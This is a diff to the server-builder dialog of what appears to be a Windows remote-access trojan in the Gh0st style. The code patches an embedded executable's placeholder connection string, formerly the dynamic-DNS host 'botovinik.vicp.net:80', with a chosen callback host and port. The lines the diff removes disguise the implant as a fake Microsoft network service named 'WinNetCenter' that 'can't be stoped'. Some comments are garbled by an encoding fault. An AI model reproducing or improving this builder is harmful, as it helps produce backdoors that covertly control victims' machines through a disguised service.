@@ -11,7 +11,7 @@
 static char THIS_FILE[] = __FILE__;
 #endif
 
-CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA("127.0.0.1", 6543);
+CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA(LOCAL_HOST, DEFAULT_PORT);
 
 /////////////////////////////////////////////////////////////////////////////
 // CServerDlg dialog
@@ -19,11 +19,13 @@ CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA("127.0.0.1", 6543);
 CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
     : CDialog(CServerDlg::IDD, pParent)
 {
-    m_Url = _T("127.0.0.1");
-    m_ServiceName = _T("WinNetCenter");
-    m_ServiceDisp = _T("MS Multi Protocal Network Control Center");
-    m_ServiceDesc = _T("Provides support for multi network protocal . This service can't be stoped.");
-    m_port = _T("80");
+    m_Url = CString(LOCAL_HOST);
+    m_ServiceName = CString(modify_data.strSvrName);
+    m_ServiceDisp = CString(modify_data.strSvrDisp);
+    m_ServiceDesc = CString(modify_data.strSvrDesc);
+    char str[20] = {};
+	itoa(DEFAULT_PORT, str, 10);
+    m_port = CString(str);
 }
 
 void CServerDlg::DoDataExchange(CDataExchange* pDX)
@@ -131,7 +133,7 @@ int LoadRes(LPBYTE *Mem, DWORD id)
 
     hResInfo = FindResource(NULL,MAKEINTRESOURCE(id),"EXE");
     if(hResInfo == NULL) {
-        Mprintf("Can't Find Resource.\n");
+        Mprintf("Can't Find Resource: %d\n", GetLastError());
         return -1;
     }
 
@@ -139,13 +141,13 @@ int LoadRes(LPBYTE *Mem, DWORD id)
 
     hResData = LoadResource(NULL,hResInfo);
     if(hResData == NULL) {
-        Mprintf("Can't Load Resource.\n");
+        Mprintf("Can't Load Resource: %d\n", GetLastError());
         return -1;
     }
 
     *Mem = (LPBYTE)GlobalAlloc(GPTR, dwSize);
     if (*Mem == NULL) {
-        Mprintf("Can't Allocate Memory.\n");
+        Mprintf("Can't Allocate Memory: %d\n", GetLastError());
         return -1;
     }
 
@@ -259,13 +261,14 @@ void CServerDlg::OnOk()
 
     dwSize = LoadRes(&p, IDR_EXE);
 
-    int iPos = MemFindStr((const char *)p, "botovinik.vicp.net:80", dwSize, lstrlen("botovinik.vicp.net:80"));
+    int iPos = MemFindStr((const char *)p, CONNECTION_FLAG, dwSize, lstrlen(CONNECTION_FLAG));
 
-    if(iPos == 0) {
+    if(iPos <= 0) {
         MessageBoxEx(NULL, "·þÎñ¶Ë¶ÁÈ¡´íÎó!", "Setup Server", 0, 0);
+        return;
     }
-
-    CopyMemory((LPVOID)(p + iPos), (LPCVOID)&modify_data, sizeof(CONNECTION_DATA)); //Ìî³äÅäÖÃÐÅÏ¢
+    CONNECTION_DATA* addr = (CONNECTION_DATA*)(p + iPos);
+    CopyMemory((LPVOID)addr, (LPCVOID)&modify_data, sizeof(CONNECTION_DATA)); //Ìî³äÅäÖÃÐÅÏ¢
 
     m_LogList.AddString("Writing Config...");
 
